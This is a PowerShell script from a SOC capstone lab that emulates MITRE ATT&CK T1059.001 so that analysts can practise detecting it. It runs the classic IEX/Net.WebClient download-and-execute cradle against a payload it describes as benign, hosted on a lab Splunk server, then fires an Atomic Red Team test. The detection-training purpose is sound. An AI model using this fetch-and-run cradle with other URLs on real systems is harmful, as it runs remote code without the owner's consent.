# =============================================================================
# 04-attacks / t1059-powershell-download-exec.ps1
# T1059.001 - PowerShell  (download & execute)
# Downloads a BENIGN payload from Splunk Web and executes it, with
# full timestamped logging. Demonstrates the classic cradle pattern a SOC must
# detect, without any real malware.
#
# Run on the Windows VM after deploying the Splunk app static payload.
# =============================================================================
$ErrorActionPreference = 'Stop'

$SplunkHost = if ($env:SPLUNK_HOST_IP) { $env:SPLUNK_HOST_IP } else { '192.168.64.1' }
$PayloadUrl = if ($env:CAPSTONE_PAYLOAD_URL) { $env:CAPSTONE_PAYLOAD_URL } else { "http://$SplunkHost`:8000/en-US/static/app/soc_capstone_detections/soc_benign_payload.ps1" }
$LogFile = Join-Path $PSScriptRoot 't1059_timeline.log'

function Log($m) {
    $line = "$(Get-Date -Format o) | $m"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line
}

Log "[T1059.001] PowerShell download & execute | target=$env:COMPUTERNAME"
Log "[T1059.001] ATT&CK = https://attack.mitre.org/techniques/T1059/001/"
Log "[T1059.001] Payload URL: $PayloadUrl (benign, lab only)"

# Classic download-and-execute cradle. The payload just echoes a marker so we
# can see execution succeeded in the timeline.
Log "[T1059.001] Executing cradle: IEX (New-Object Net.WebClient).DownloadString(...)"
try {
    $output = IEX (New-Object System.Net.WebClient).DownloadString($PayloadUrl)
    Log "[T1059.001] RESULT: payload executed. Output: $output"
} catch {
    Log "[T1059.001] ERROR: $($_.Exception.Message)"
}

# Also fire the Atomic Red Team equivalent for a reproducible, ATT&CK-tagged run
try {
    Import-Module Invoke-AtomicTest
    Log "[T1059.001] Running Invoke-AtomicTest T1059.001 ..."
    Invoke-AtomicTest T1059.001 -ExecutionLogPath "$PWD\atomic-exec.log"
} catch {
    Log "[T1059.001] Atomic run skipped: $($_.Exception.Message)"
}

Log "[T1059.001] END | timeline -> $LogFile"
